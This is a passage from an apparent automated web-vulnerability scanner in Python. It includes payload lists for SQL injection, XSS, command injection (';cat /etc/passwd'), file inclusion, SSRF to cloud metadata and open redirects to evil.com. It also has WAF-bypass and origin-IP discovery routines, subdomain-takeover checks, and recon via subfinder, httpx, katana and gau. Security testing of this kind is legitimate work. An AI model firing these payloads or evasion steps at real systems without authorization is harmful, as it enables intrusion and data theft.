                    if resp.status_code == baseline['status'] and resp.status_code == 200:
                        if current_hash != baseline['hash']:
                            if length_ratio > 0.2:
                                idor_detected = True
                                confidence_factors.append('different_content')
                    
                    extracted_ids = self.extract_ids_from_response(resp.text, url)
                    
                    sensitive_patterns = ['password', 'credit', 'ssn', 'secret', 'token', 'auth', 'private']
                    has_sensitive = any(p in resp.text.lower() for p in sensitive_patterns)
                    if has_sensitive:
                        confidence_factors.append('sensitive_data')
                    
                    if original_value in resp.text and test_value != original_value:
                        confidence_factors.append('original_id_reflected')
                    
                    if length_ratio > 0.5:
                        confidence_factors.append('significant_size_change')
                    
                    if idor_detected or confidence_factors:
                        confidence_score = 0.3
                        if 'different_content' in confidence_factors:
                            confidence_score += 0.2
                        if 'sensitive_data' in confidence_factors:
                            confidence_score += 0.3
                        if 'original_id_reflected' in confidence_factors:
                            confidence_score += 0.2
                        if 'significant_size_change' in confidence_factors:
                            confidence_score += 0.2
                        
                        confidence_score = min(confidence_score, 1.0)
                        
                        if confidence_score >= 0.9:
                            confidence = 'HIGH'
                        elif confidence_score >= 0.6:
                            confidence = 'MEDIUM'
                        else:
                            confidence = 'LOW'
                        
                        findings.append({
                            'test_value': test_value,
                            'status': resp.status_code,
                            'length': len(resp.text),
                            'hash_match': current_hash == baseline['hash'],
                            'confidence': confidence,
                            'confidence_score': confidence_score,
                            'factors': confidence_factors,
                            'extracted_ids': extracted_ids,
                            'response_preview': resp.text[:200] + '...'
                        })
                        
                        print(f"{Y}[IDOR] Potential finding with value: {test_value} (Confidence: {confidence}){W}")
                        
                except Exception as e:
                    continue
            
            if findings:
                findings.sort(key=lambda x: x['confidence_score'], reverse=True)
                return findings
            
            return None
            
        except Exception as e:
            return None


# ===== WAF BYPASS TECHNIQUES (النسخة القديمة) =====
class AdvancedWAFBypass:
    @staticmethod
    def obfuscate_sql(payload):
        return [AdvancedWAFBypassV2.apply_all_bypasses(payload, 'sqli')]
    
    @staticmethod
    def obfuscate_xss(payload):
        return [AdvancedWAFBypassV2.apply_all_bypasses(payload, 'xss')]
    
    @staticmethod
    def obfuscate_rce(payload):
        return [AdvancedWAFBypassV2.apply_all_bypasses(payload, 'rce')]


# ===== PAYLOADS =====
class AdvancedPayloads:
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT null--",
        "' AND 1=2 UNION SELECT 1,2,3--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--"
    ]

    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '\'"><svg/onload=alert(1)>',
        'javascript:alert(1)',
        '<body onload=alert(1)>'
    ]

    RCE_PAYLOADS = [
        ';id',
        '&&id',
        '|id',
        '`id`',
        '$(id)',
        ';whoami',
        '&&whoami',
        ';uname -a',
        '&&uname -a',
        ';cat /etc/passwd',
        '&&cat /etc/passwd'
    ]

    LFI_PAYLOADS = [
        '../../../../etc/passwd',
        '....//....//....//....//etc/passwd',
        '/etc/passwd',
        '..\\..\\..\\..\\windows\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
    ]

    SSRF_PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]',
        'http://0.0.0.0',
        'file:///etc/passwd',
        'gopher://localhost:8080',
        'dict://localhost:11211',
        'ftp://localhost:21'
    ]

    OPEN_REDIRECT_PAYLOADS = [
        'https://evil.com',
        '//evil.com',
        'https:%2f%2fevil.com',
        'https://evil.com@google.com',
        '/\\evil.com',
        'https://evil.com/..',
        'https:evil.com',
        'javascript:alert(1)//evil.com',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'https://evil.com#@google.com',
        '//google.com@evil.com',
        'https://evil.com/%2f%2fgoogle.com',
        '///evil.com',
        'https://evil.com\\@google.com',
        '/.evil.com',
        '//evil.com%2f%2f.google.com'
    ]

    SSTI_PAYLOADS = [
        '{{999*999}}',
        '${999*999}',
        '<%=999*999%>',
        '{999*999}',
        '#{999*999}',
        '{{999*\'999\'}}',
        '{{999999-1}}',
        '${999*999}',
        '{{999999999-1}}',
        '{{999999999*999999999}}',
        '${999999999-1}',
        '<%= 999999999 * 999999999 %>',
        '{{999999999**2}}',
        '{{999999999^2}}'
    ]

    WORDPRESS_PAYLOADS = {
        'paths': ['/wp-admin/', '/wp-login.php', '/xmlrpc.php', '/wp-config.php', '/wp-config.php.bak'],
        'vulnerable': ['/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php', '/wp-content/plugins/']
    }


# ===== LOGIC ENGINE =====
class AdvancedLogicEngine:
    @staticmethod
    def calculate_similarity(response1, response2):
        if not response1 or not response2:
            return 1.0
        return SequenceMatcher(None, response1.text, response2.text).ratio()


# ===== SUBDOMAIN TAKEOVER SIGNATURES =====
SUBDOMAIN_TAKEOVER_SIGNATURES = {
    'AWS S3': {
        'patterns': [r'NoSuchBucket', r'Bucket does not exist'],
        'cnames': ['.s3.amazonaws.com'],
    },
    'GitHub Pages': {
        'patterns': [r'There isn\'t a GitHub Pages site here'],
        'cnames': ['.github.io'],
    },
    'Heroku': {
        'patterns': [r'No such app', r'Heroku'],
        'cnames': ['.herokuapp.com'],
    },
    'Azure': {
        'patterns': [r'Microsoft Azure', r'Azure Web App'],
        'cnames': ['.azurewebsites.net'],
    },
    'Firebase': {
        'patterns': [r'Firebase', r'Firebase Hosting'],
        'cnames': ['.firebaseapp.com', '.web.app'],
    },
    'Cloudflare': {
        'patterns': [r'Cloudflare'],
        'cnames': ['.cloudflare.com'],
    },
    'Fastly': {
        'patterns': [r'Fastly error'],
        'cnames': ['.fastly.net'],
    },
    'Shopify': {
        'patterns': [r'Shopify', r'shopify.com'],
        'cnames': ['.myshopify.com'],
    },
}


# ===== SUBDOMAIN TAKEOVER DETECTOR =====
class SubdomainTakeoverDetector:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(USER_COOKIES)

    def get_cname(self, domain):
        try:
            answers = dns.resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                return str(rdata.target).rstrip('.')
        except:
            try:
                result = socket.gethostbyname_ex(domain)
                if result[0] != domain:
                    return result[0]
            except:
                pass
        return None

    def check_domain_takeover(self, domain):
        try:
            test_urls = [f"https://{domain}", f"http://{domain}"]

            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    cname = self.get_cname(domain)

                    for service, signatures in SUBDOMAIN_TAKEOVER_SIGNATURES.items():
                        if cname:
                            for cname_pattern in signatures['cnames']:
                                if cname_pattern in cname:
                                    for pattern in signatures['patterns']:
                                        if re.search(pattern, response.text, re.IGNORECASE):
                                            return {
                                                'service': service,
                                                'domain': domain,
                                                'cname': cname,
                                                'url': test_url,
                                                'confidence': 'HIGH'
                                            }
                except:
                    continue
            return None
        except:
            return None


# ===== RECON ENGINE =====
class ReconEngine:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def discover_subdomains(self, domain):
        """Discover subdomains using multiple tools"""
        print(f"{Y}[*] Discovering subdomains for {domain}...{W}")

        subdomains_file = f"{self.output_dir}/subdomains.txt"
        all_subs = set()

        try:
            print(f"{B}[*] Running Subfinder...{W}")
            result = subprocess.run(
                f"subfinder -d {domain} -silent -all -o {subdomains_file}.subfinder",
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )

            if os.path.exists(f"{subdomains_file}.subfinder"):
                with open(f"{subdomains_file}.subfinder", 'r') as f:
                    subs = [line.strip() for line in f if line.strip()]
                    all_subs.update(subs)
                    print(f"{G}[+] Subfinder found: {len(subs)} subdomains{W}")
        except Exception as e:
            print(f"{R}[!] Subfinder failed: {str(e)[:50]}...{W}")

        try:
            print(f"{B}[*] Running Assetfinder...{W}")
            result = subprocess.run(
                f"assetfinder --subs-only {domain}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            if result.stdout:
                subs = [line.strip() for line in result.stdout.split('\n') if line.strip()]
                all_subs.update(subs)
                print(f"{G}[+] Assetfinder found: {len(subs)} subdomains{W}")
        except:
            pass

        common_subs = [
            'www', 'mail', 'api', 'dev', 'staging', 'admin', 'test',
            'blog', 'shop', 'store', 'app', 'web', 'cdn', 'ftp',
            'mobile', 'portal', 'support', 'help', 'docs', 'wiki'
        ]

        for sub in common_subs:
            all_subs.add(f"{sub}.{domain}")

        all_subs.add(domain)

        with open(subdomains_file, 'w') as f:
            for sub in sorted(all_subs):
                f.write(f"{sub}\n")

        print(f"{G}[+] Total unique subdomains: {len(all_subs)}{W}")
        return list(all_subs)

    def filter_live_subdomains(self, subdomains):
        """Filter only live subdomains using httpx"""
        print(f"{Y}[*] Filtering live subdomains...{W}")

        live_subs_file = f"{self.output_dir}/live_subdomains.txt"
        temp_file = f"{self.output_dir}/temp_subs.txt"

        with open(temp_file, 'w') as f:
            for sub in subdomains:
                f.write(f"{sub}\n")

        try:
            print(f"{B}[*] Running httpx for live hosts...{W}")
            result = subprocess.run(
                f"httpx -l {temp_file} -silent -sc -title -tech-detect -o {live_subs_file}.raw",
                shell=True,
                capture_output=True,
                text=True,
                timeout=600
            )

            live_subs = []
            if os.path.exists(f"{live_subs_file}.raw"):
                with open(f"{live_subs_file}.raw", 'r') as f:
                    for line in f:
                        if line.strip():
                            url = line.strip().split()[0] if ' ' in line else line.strip()
                            live_subs.append(url)

                with open(live_subs_file, 'w') as f:
                    for url in live_subs:
                        parsed = urlparse(url) if '://' in url else urlparse(f"https://{url}")
                        f.write(f"{parsed.scheme}://{parsed.netloc}\n")

                print(f"{G}[+] Live subdomains: {len(live_subs)}{W}")
                return live_subs
            else:
                print(f"{R}[!] httpx failed to find live subdomains{W}")
                return subdomains[:10]

        except Exception as e:
            print(f"{R}[!] httpx failed: {str(e)[:50]}...{W}")
            return subdomains[:10]

    def discover_urls_from_subdomains(self, subdomains):
        """Discover URLs from each live subdomain"""
        print(f"{Y}[*] Discovering URLs from subdomains...{W}")

        all_urls_file = f"{self.output_dir}/all_urls.txt"
        all_urls = set()

        for i, subdomain in enumerate(subdomains, 1):
            try:
                print(f"{B}[*] Processing subdomain {i}/{len(subdomains)}: {subdomain}{W}")

                if '://' in subdomain:
                    domain = urlparse(subdomain).netloc
                else:
                    domain = subdomain

                try:
                    katana_file = f"{self.output_dir}/katana_{domain.replace('.', '_')}.txt"
                    subprocess.run(
                        f'echo "{subdomain}" | katana -silent -d 3 -jc -kf -fx -o {katana_file}',
                        shell=True,
                        timeout=180,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )

                    if os.path.exists(katana_file) and os.path.getsize(katana_file) > 0:
                        with open(katana_file, 'r') as f:
                            urls = [line.strip() for line in f if line.strip()]
                            all_urls.update(urls)
                            print(f"  {G}[+] Katana found {len(urls)} URLs{W}")
                except:
                    pass

                try:
                    gau_file = f"{self.output_dir}/gau_{domain.replace('.', '_')}.txt"
                    subprocess.run(
                        f'echo "{domain}" | gau --subs --threads 10 --o {gau_file}',
                        shell=True,
                        timeout=120,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )

                    if os.path.exists(gau_file) and os.path.getsize(gau_file) > 0:
                        with open(gau_file, 'r') as f:
                            urls = [line.strip() for line in f if line.strip()]
                            all_urls.update(urls)
                            print(f"  {G}[+] Gau found {len(urls)} URLs{W}")
                except:
                    pass

                common_paths = [
                    '/', '/admin', '/login', '/api', '/wp-admin', '/dashboard',
                    '/config', '/test', '/debug', '/.env', '/.git', '/api/v1',
                    '/graphql', '/swagger', '/vendor', '/uploads'
                ]

                base_url = subdomain if subdomain.startswith('http') else f"https://{subdomain}"
                for path in common_paths:
                    all_urls.add(f"{base_url.rstrip('/')}{path}")

            except Exception as e:
                print(f"  {R}[!] Error processing {subdomain}: {str(e)[:50]}...{W}")
                continue

        with open(all_urls_file, 'w') as f:
            for url in sorted(all_urls):
                f.write(f"{url}\n")

        print(f"{G}[+] Total unique URLs discovered: {len(all_urls)}{W}")
        return list(all_urls)


# ===== WORDPRESS SCANNER =====
class WordPressScanner:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(USER_COOKIES)

    def check_wordpress(self):
        checks = [f"{self.base_url}/wp-login.php", f"{self.base_url}/wp-admin/"]
        for url in checks:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code == 200 and 'wp-content' in resp.text.lower():
                    return True
            except:
                continue
        return False


# ===== EXECUTION CONTROLLER LAYER =====
class ExecutionControllerLayer:
    """Smart execution controller that decides which tests to run"""

    def __init__(self, scanner):
        self.scanner = scanner
        # تمرير الكوكيز من السكانر للـ baseline profiler
        cookies = None
        if hasattr(scanner, 'session') and hasattr(scanner.session, 'cookies'):
            cookies = scanner.session.cookies.get_dict()
        self.baseline_profiler = BaselineProfiler(cookies)
        self.reflection_analyzer = ReflectionContextAnalyzer()
        self.confidence_scorer = ConfidenceScorer()
        self.ssrf_intelligence = SSRFTriggerIntelligence()
        self.redirect_validator = OpenRedirectStrictValidator()
        self.idor_intelligence = IDORIntelligenceEngine(scanner)

    def classify_endpoint(self, url):
        """Classify endpoint to determine capabilities"""
        classification = {
            'url': url,
            'has_parameters': False,
            'parameters': [],
            'parameter_values': {},
            'content_type': None,
            'is_api': False,
            'is_static': False,
            'technologies': [],
            'waf_detected': None,
            'capabilities': {
                'reflects_input': False,
                'fetches_urls': False,
                'redirects': False,
                'database_interaction': False,
                'file_access': False,
                'has_id_params': False
            }
        }

        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query, keep_blank_values=True)

            if query:
                classification['has_parameters'] = True
                classification['parameters'] = list(query.keys())
                classification['parameter_values'] = {k: v[0] if v else '' for k, v in query.items()}
                
                for param in classification['parameters']:
                    if param.lower() in IDOR_PARAMS or any(id_pattern in param.lower() for id_pattern in ['id', 'user', 'account', 'profile', 'customer']):
                        classification['capabilities']['has_id_params'] = True
                        break

            baseline = self.baseline_profiler.get_baseline(url)
            if baseline:
                content_type = baseline.get('content_type', '')
                classification['content_type'] = content_type
                classification['waf_detected'] = baseline.get('waf_detected')

                if 'json' in content_type:
                    classification['is_api'] = True
                elif 'javascript' in content_type or 'image' in content_type:
                    classification['is_static'] = True

        except Exception as e:
            pass

        return classification

    def get_relevant_tests(self, classification, capabilities):
        """Get list of relevant tests based on capabilities"""
        tests = ['secrets', 'cors']

        if capabilities.get('has_id_params', False):
            tests.append('idor')

        if classification.get('has_parameters'):
            tests.extend(['xss', 'sqli', 'ssti'])

        if capabilities.get('fetches_urls'):
            tests.append('ssrf')

        if capabilities.get('redirects'):
            tests.append('open_redirect')

        if capabilities.get('file_access'):
            tests.append('lfi')

        if 'wordpress' in classification.get('technologies', []):
            tests.append('wordpress')

        return list(set(tests))

    def verify_finding(self, vuln_type, evidence):
        verified = False
        confidence = self.confidence_scorer.calculate_confidence(vuln_type, evidence)

        if vuln_type == 'xss':
            verified = evidence.get('reflection_context') in ['script', 'attribute'] and not evidence.get('is_escaped')
        elif vuln_type == 'open_redirect':
            verified = evidence.get('validated', False)
        elif vuln_type == 'ssrf':
            verified = evidence.get('external_dns', False) or evidence.get('fetch_behavior', False)
        elif vuln_type == 'sqli':
            verified = evidence.get('time_based', False) or evidence.get('behavioral_change', False)
        elif vuln_type == 'idor':
            verified = evidence.get('accessed_other_user_data', False) or evidence.get('sensitive_data', False)
        else:
            verified = evidence.get('verified', False)

        return {'verified': verified, 'confidence': confidence}

    def score_finding(self, vuln_type, context, evidence):
        confidence = self.confidence_scorer.calculate_confidence(vuln_type, evidence)
        severity = self.confidence_scorer.calculate_severity(vuln_type, context, confidence)
        return {'confidence': confidence, 'severity': severity}


# ===== MAIN SCANNER =====
class AdvancedScanner:
    def __init__(self, target=None, timeout=15, cookies=None, db_session=None, VulnerabilityModel=None, user_id=None):
        self.target = target
        self.timeout = timeout
        self.db_session = db_session
        self.VulnerabilityModel = VulnerabilityModel
        self.user_id = user_id
        self.session = requests.Session()
        self.session.verify = False
        if cookies:
            self.session.cookies.update(cookies)
        self.waf_bypass = AdvancedWAFBypass()
        self.waf_bypass_v2 = AdvancedWAFBypassV2()
        self.fp_filter = AdvancedFalsePositiveFilter()
        self.logic = AdvancedLogicEngine()
        self.baseline_profiler = BaselineProfiler(cookies)
        self.reflection_analyzer = ReflectionContextAnalyzer()
        self.confidence_scorer = ConfidenceScorer()
        self.ssrf_intelligence = SSRFTriggerIntelligence()
        self.redirect_validator = OpenRedirectStrictValidator()
        self.idor_intelligence = IDORIntelligenceEngine(self)
        self.execution_controller = ExecutionControllerLayer(self)
        self.response_cache = {}
        self.wp_scanner = None
        self.payloads_used = {}

    # ===== NEW: Save vulnerability to database =====
    def save_vuln(self, v_type, severity, payload, description, url=None, param=None, confidence='MEDIUM'):
        """Save vulnerability to database if db_session is available"""
        if self.db_session and self.VulnerabilityModel:
            try:
                new_vuln = self.VulnerabilityModel(
                    target=self.target or url,
                    type=v_type,
                    severity=severity,
                    payload=payload,
                    description=description,
                    user_id=self.user_id,
                    confidence=confidence,
                    parameter=param,
                    discovery_date=datetime.utcnow()
                )
                self.db_session.add(new_vuln)
                self.db_session.commit()
                print(f"{G}[+] Saved to Database! {v_type} - {severity}{W}")
                return True
            except Exception as e:
                print(f"{R}[!] DB Save Error: {e}{W}")
                self.db_session.rollback()
        return False

    def get_headers(self):
        return self.waf_bypass_v2.get_chrome_fingerprint()['headers']

    def get_response(self, url, use_curl=False):
        cache_key = f"{url}_{use_curl}"
        if cache_key not in self.response_cache:
            try:
                headers = self.get_headers()
                
                if use_curl and CURL_CFFI_AVAILABLE:
                    session = self.waf_bypass_v2.get_curl_cffi_session()
                    if session:
                        if hasattr(self, 'session') and hasattr(self.session, 'cookies'):
                            session.cookies.update(self.session.cookies.get_dict())
                        resp = session.get(url, headers=headers, timeout=self.timeout, verify=False)
                    else:
                        resp = self.session.get(url, headers=headers, timeout=self.timeout, verify=False)
                else:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout, verify=False)
                    
                if resp.status_code >= 400:
                    return None
                self.response_cache[cache_key] = resp
            except Exception as e:
                print(f"Error getting response: {e}")
                self.response_cache[cache_key] = None
        return self.response_cache.get(cache_key)

    def extract_parameters(self, url):
        parsed = urlparse(url)
        return list(parse_qs(parsed.query, keep_blank_values=True).keys())

    def inject_payload(self, url, payload, param_filter=True):
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)

        if not query:
            return f"{url}?test={quote(payload)}"

        for key in list(query.keys()):
            if param_filter and not any(skip in key.lower() for skip in SKIP_PARAMS):
                new_query = query.copy()
                new_query[key] = [payload]
                new_query_string = urlencode(new_query, doseq=True)
                return urlunparse(parsed._replace(query=new_query_string))

        return url

    def inject_specific_param(self, url, param_name, payload):
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)

        if param_name in query:
            new_query = query.copy()
            new_query[param_name] = [payload]
            new_query_string = urlencode(new_query, doseq=True)
            return urlunparse(parsed._replace(query=new_query_string))
        else:
            if query:
                new_query = query.copy()
                new_query[param_name] = [payload]
                new_query_string = urlencode(new_query, doseq=True)
                return urlunparse(parsed._replace(query=new_query_string))
            else:
                return f"{url}?{param_name}={quote(payload)}"

    def extract_title(self, html):
        if not html:
            return ''
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else ''

    def pre_check_url(self, url):
        try:
            headers = self.get_headers()
            resp = self.session.head(url, headers=headers, timeout=5, verify=False)
            if resp.status_code >= 400:
                return False
            content_type = resp.headers.get('content-type', '').lower()
            if any(ct in content_type for ct in ['image/', 'video/', 'audio/', 'font/']):
                return False
            return True
        except:
            return False

    # ===== MAIN SCAN FUNCTION =====
    def scan_url(self, url):
        """
        المسح الشامل لجميع أنواع الثغرات على رابط معين
        """
        results = []
        
        print(f"\n{'='*60}")
        print(f"🔍 Scanning URL: {url}")
        print(f"{'='*60}")
        
        # Get baseline first
        try:
            baseline = self.baseline_profiler.get_baseline(url)
            print(f"[✓] Baseline created: Status {baseline.get('status') if baseline else 'N/A'}")
        except Exception as e:
            print(f"[!] Error creating baseline: {e}")
        
        # Classify endpoint and detect capabilities
        try:
            classification = self.execution_controller.classify_endpoint(url)
            capabilities = classification['capabilities']
            relevant_tests = self.execution_controller.get_relevant_tests(classification, capabilities)
            
            print(f"\n[+] Endpoint Classification:")
            print(f"    • Has Parameters: {classification['has_parameters']}")
            print(f"    • Parameters: {classification['parameters']}")
            print(f"    • WAF Detected: {classification.get('waf_detected', 'None')}")
            print(f"    • Capabilities: {capabilities}")
            print(f"    • Relevant Tests: {relevant_tests}")
            
        except Exception as e:
            print(f"[!] Error in classification: {e}")
            # Fallback to all tests
            relevant_tests = ['sqli', 'xss', 'rce', 'lfi', 'ssrf', 'open_redirect', 'cors', 'secrets', 'xxe', 'ssti', 'idor']
            capabilities = {}
            classification = {'has_parameters': False, 'parameters': []}
        
        # Discover origin IP if domain
        try:
            parsed = urlparse(url)
            if parsed.netloc:
                origin_ips = self.waf_bypass_v2.discover_origin_ip(parsed.netloc)
                if origin_ips:
                    print(f"\n[+] Origin IPs Found: {', '.join(origin_ips)}")
        except Exception as e:
            print(f"[!] Error discovering origin IP: {e}")
        
        # قائمة بجميع أنواع الثغرات مع دوال الفحص
        checks = {
            'sqli': ('SQL Injection', self.check_sqli),
            'xss': ('Cross-Site Scripting (XSS)', self.check_xss),
            'rce': ('Remote Code Execution (RCE)', self.check_rce),
            'lfi': ('Local File Inclusion (LFI)', self.check_lfi),
            'ssrf': ('Server-Side Request Forgery (SSRF)', self.check_ssrf),
            'open_redirect': ('Open Redirect', self.check_open_redirect),
            'cors': ('CORS Misconfiguration', self.check_cors),
            'secrets': ('Secrets Exposure', self.check_secrets),
            'xxe': ('XML External Entity (XXE)', self.check_xxe),
            'ssti': ('Server-Side Template Injection (SSTI)', self.check_ssti),
            'idor': ('Insecure Direct Object References (IDOR)', self.check_idor)
        }
        
        # فحص كل نوع ثغرة بناء على relevant_tests
        print(f"\n{'='*60}")
        print(f"🔬 Starting Vulnerability Tests")
        print(f"{'='*60}")
        
        for test_key, (vuln_name, check_func) in checks.items():
            # شوف إذا كان هذا الاختبار relevant
            if test_key in relevant_tests:
                try:
                    print(f"\n[*] Testing: {vuln_name}")
                    
                    # اختبر الثغرة
                    result = check_func(url)
                    
                    if result:
                        # معالجة النتائج
                        if isinstance(result, list):
                            for item in result:
                                if item:
                                    if isinstance(item, dict):
                                        if 'type' not in item:
                                            item['type'] = vuln_name
                                        results.append(item)
                                        severity = item.get('severity', 'INFO')
                                        print(f"  [✓] Found: {item.get('type', vuln_name)} - {severity}")
                                    else:
                                        vuln_dict = {
                                            'type': vuln_name,
                                            'details': str(item),
                                            'url': url,
                                            'severity': 'INFO',
                                            'confidence': 'LOW'
                                        }
                                        results.append(vuln_dict)
                                        # Save to database
                                        self.save_vuln(
                                            v_type=vuln_name,
                                            severity='INFO',
                                            payload=None,
                                            description=str(item),
                                            url=url,
                                            confidence='LOW'
                                        )
                                        print(f"  [✓] Found issue")
                        elif isinstance(result, dict):
                            if 'type' not in result:
                                result['type'] = vuln_name
                            results.append(result)
                            severity = result.get('severity', 'INFO')
                            # Save to database
                            self.save_vuln(
                                v_type=result.get('type', vuln_name),
                                severity=severity,
                                payload=result.get('payload'),
                                description=result.get('details', {}),
                                url=url,
                                param=result.get('param'),
                                confidence=result.get('confidence', 'MEDIUM')
                            )
                            print(f"  [✓] Found: {result.get('type', vuln_name)} - {severity}")
                        elif result:
                            vuln_dict = {
                                'type': vuln_name,
                                'details': str(result),
                                'url': url,
                                'severity': 'INFO',
                                'confidence': 'LOW'
                            }
                            results.append(vuln_dict)
                            # Save to database
                            self.save_vuln(
                                v_type=vuln_name,
                                severity='INFO',
                                payload=None,
                                description=str(result),
                                url=url,
                                confidence='LOW'
                            )
                            print(f"  [✓] Found issue")
                        else:
                            print(f"  [-] No issues found")
                    else:
                        print(f"  [-] No issues found")
                        
                except Exception as e:
                    print(f"  [!] Error testing {vuln_name}: {e}")
                    continue
            else:
                print(f"\n[*] Skipping {vuln_name} (not relevant for this endpoint)")
        
        print(f"\n{'='*60}")
        print(f"✅ Scan completed! Found {len(results)} vulnerabilities")
        print(f"{'='*60}")
        
        return results

    # ===== 1. SQL INJECTION =====
    def check_sqli(self, url):
        params = self.extract_parameters(url)
        if not params:
            return None
        for param in params:
            result = self.test_sqli_on_param(url, param)
            if result:
                return result
        return None

    def test_sqli_on_param(self, url, param_name):
        baseline = self.baseline_profiler.get_baseline(url)
        if not baseline:
            return None
        waf_detected = baseline.get('waf_detected', [])
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        for payload in AdvancedPayloads.SQLI_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            obfuscated = self.waf_bypass.obfuscate_sql(payload)
            for obf_payload in obfuscated:
                payload_fingerprint = self.baseline_profiler.get_payload_fingerprint(
                    url, param_name, obf_payload, use_curl=use_curl
                )
                if not payload_fingerprint:
                    continue
                comparison = self.baseline_profiler.compare_with_baseline(baseline, payload_fingerprint)

                is_time_based = 'sleep' in obf_payload.lower() or 'delay' in obf_payload.lower()
                time_diff = False
                if is_time_based:
                    start = time.time()
                    self.baseline_profiler.get_payload_fingerprint(url, param_name, obf_payload, use_curl=use_curl)
                    elapsed = time.time() - start
                    time_diff = elapsed > 5

                behavioral_change = comparison['similarity'] < 0.7 and not comparison.get('is_dynamic', False)
                has_db_errors = self.fp_filter.contains_database_error_indicators(
                    payload_fingerprint.get('body_preview', ''))

                if time_diff or behavioral_change or has_db_errors:
                    evidence = {
                        'verified': True,
                        'time_based': time_diff,
                        'behavioral_change': behavioral_change,
                        'has_db_errors': has_db_errors,
                        'similarity': comparison['similarity'],
                        'bypassed_waf': bool(waf_detected)
                    }
                    verification = self.execution_controller.verify_finding('sqli', evidence)
                    if verification['verified']:
                        context = {'sensitive_param': param_name in ['user', 'pass', 'id', 'admin']}
                        score = self.execution_controller.score_finding('sqli', context, evidence)
                        
                        result = {
                            'vulnerable': True,
                            'type': 'SQLi',
                            'url': url,
                            'param': param_name,
                            'payload': obf_payload,
                            'waf_bypassed': waf_detected if waf_detected else 'None',
                            'confidence': score['confidence']['level'],
                            'severity': score['severity'],
                            'details': {
                                'time_based': time_diff,
                                'behavioral_change': behavioral_change,
                                'database_errors': has_db_errors,
                                'similarity_ratio': comparison['similarity']
                            },
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        
                        # Save to database
                        self.save_vuln(
                            v_type='SQLi',
                            severity=score['severity'],
                            payload=obf_payload,
                            description=f"Time-based: {time_diff}, DB Errors: {has_db_errors}",
                            url=url,
                            param=param_name,
                            confidence=score['confidence']['level']
                        )
                        
                        return result
        return None

    # ===== 2. XSS =====
    def check_xss(self, url):
        params = self.extract_parameters(url)
        if not params:
            return None
        for param in params:
            result = self.test_xss_on_param(url, param)
            if result:
                return result
        return None

    def test_xss_on_param(self, url, param_name):
        baseline = self.baseline_profiler.get_baseline(url)
        waf_detected = baseline.get('waf_detected', []) if baseline else []
        use_curl = 'Cloudflare' in waf_detected if waf_detected else False

        test_marker = 'XSS_TEST_' + ''.join(random.choices(string.ascii_uppercase, k=6))
        payload_fingerprint = self.baseline_profiler.get_payload_fingerprint(
            url, param_name, test_marker, use_curl=use_curl
        )
        if not payload_fingerprint:
            return None

        reflection = self.reflection_analyzer.analyze_reflection(
            payload_fingerprint.get('body_preview', ''), test_marker
        )
        if not reflection['reflected']:
            return None

        for payload in AdvancedPayloads.XSS_PAYLOADS:
            if waf_detected:
                for waf in waf_detected:
                    payload = self.waf_bypass_v2.bypass_for_waf(payload, waf)
            obfuscated = self.waf_bypass.obfuscate_xss(payload)
            for obf_payload in obfuscated:
                payload_fingerprint = self.baseline_profiler.get_payload_fingerprint(
                    url, param_name, obf_payload, use_curl=use_curl
                )
                if not payload_fingerprint:
                    continue

                reflection = self.reflection_analyzer.analyze_reflection(
                    payload_fingerprint.get('body_preview', ''), obf_payload
                )

                if reflection['reflected'] and reflection['is_executable'] and not reflection['is_escaped']:
                    evidence = {
                        'verified': True,
                        'reflection_context': 'executable' if reflection['is_executable'] else 'non_executable',
                        'is_escaped': reflection['is_escaped'],
                        'contexts': reflection['contexts'],
                        'bypassed_waf': bool(waf_detected)
                    }
                    verification = self.execution_controller.verify_finding('xss', evidence)
                    if verification['verified']:
                        score = self.execution_controller.score_finding('xss', {}, evidence)
                        
                        result = {
                            'vulnerable': True,
                            'type': 'XSS',
                            'url': url,
                            'param': param_name,
                            'payload': obf_payload,
                            'waf_bypassed': waf_detected if waf_detected else 'None',
                            'confidence': score['confidence']['level'],
                            'severity': score['severity'],
                            'details': {
                                'reflection_context': reflection['contexts'],
                                'is_executable': reflection['is_executable'],
                                'is_escaped': reflection['is_escaped'],
                                'reflection_count': reflection['count']
                            },
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        
                        # Save to database
                        self.save_vuln(
                            v_type='XSS',
                            severity=score['severity'],
                            payload=obf_payload,
                            description=f"Reflected in {', '.join(reflection['contexts'])}, Executable: {reflection['is_executable']}",
                            url=url,
                            param=param_name,
                            confidence=score['confidence']['level']
                        )
                        
                        return result
        return None

    # ===== 3. RCE =====
    def check_rce(self, url):
        baseline = self.baseline_profiler.get_baseline(url)
